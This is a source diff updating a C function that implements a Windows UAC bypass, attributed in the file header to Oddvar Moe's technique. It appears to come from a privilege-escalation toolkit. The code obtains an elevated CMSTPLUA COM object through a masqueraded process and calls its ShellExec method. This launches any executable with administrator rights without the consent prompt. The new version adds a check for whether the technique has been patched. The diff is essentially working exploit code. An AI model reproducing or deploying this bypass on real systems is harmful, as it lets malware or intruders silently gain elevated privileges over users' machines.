@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017
+*  (C) COPYRIGHT AUTHORS, 2017 - 2019
 *
 *  TITLE:       API0CRADLE.C
 *
-*  VERSION:     2.82
+*  VERSION:     3.17
 *
-*  DATE:        02 Nov 2017
+*  DATE:        18 Mar 2019
 *
 *  UAC bypass method from Oddvar Moe aka api0cradle.
 *
@@ -27,54 +27,62 @@
 * This function expects that supMasqueradeProcess was called on process initialization.
 *
 */
-BOOL ucmCMLuaUtilShellExecMethod(
+NTSTATUS ucmCMLuaUtilShellExecMethod(
     _In_ LPWSTR lpszExecutable
 )
 {
-    HRESULT          r = E_FAIL;
-    BOOL             bCond = FALSE;
-    IID              xIID_ICMLuaUtil;
-    CLSID            xCLSID_ICMLuaUtil;
+    NTSTATUS         MethodResult = STATUS_ACCESS_DENIED;
+    HRESULT          r = E_FAIL, hr_init;
+    BOOL             bApprove = FALSE;
     ICMLuaUtil      *CMLuaUtil = NULL;
+
+    hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
     do {
 
-        if (lpszExecutable == NULL)
-            break;
-
-        if (CLSIDFromString(T_CLSID_CMSTPLUA, &xCLSID_ICMLuaUtil) != NOERROR) {
-            break;
+        //
+        // Potential fix check.
+        //
+        if (supIsConsentApprovedInterface(T_CLSID_CMSTPLUA, &bApprove)) {
+            if (bApprove == FALSE)
+                if (ucmShowQuestion(UACFIX) != IDYES) {
+                    MethodResult = STATUS_CANCELLED;
+                    break;
+                }
         }
-        if (IIDFromString(T_IID_ICMLuaUtil, &xIID_ICMLuaUtil) != S_OK) {
-            break;
-        }
 
-        r = ucmMasqueradedCoGetObjectElevate(
+        r = ucmAllocateElevatedObject(
             T_CLSID_CMSTPLUA,
+            &IID_ICMLuaUtil,
             CLSCTX_LOCAL_SERVER,
-            &xIID_ICMLuaUtil,
-            &CMLuaUtil);
+            (void**)&CMLuaUtil);
 
         if (r != S_OK)
             break;
 
         if (CMLuaUtil == NULL) {
-            r = E_FAIL;
+            r = E_OUTOFMEMORY;
             break;
         }
 
-        r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, 
-            lpszExecutable, 
-            NULL, 
-            NULL, 
-            SEE_MASK_DEFAULT, 
+        r = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil,
+            lpszExecutable,
+            NULL,
+            NULL,
+            SEE_MASK_DEFAULT,
             SW_SHOW);
 
-    } while (bCond);
+        if (SUCCEEDED(r))
+            MethodResult = STATUS_SUCCESS;
+
+    } while (FALSE);
 
     if (CMLuaUtil != NULL) {
         CMLuaUtil->lpVtbl->Release(CMLuaUtil);
     }
 
-    return SUCCEEDED(r);
+    if (hr_init == S_OK)
+        CoUninitialize();
+
+    return MethodResult;
 }
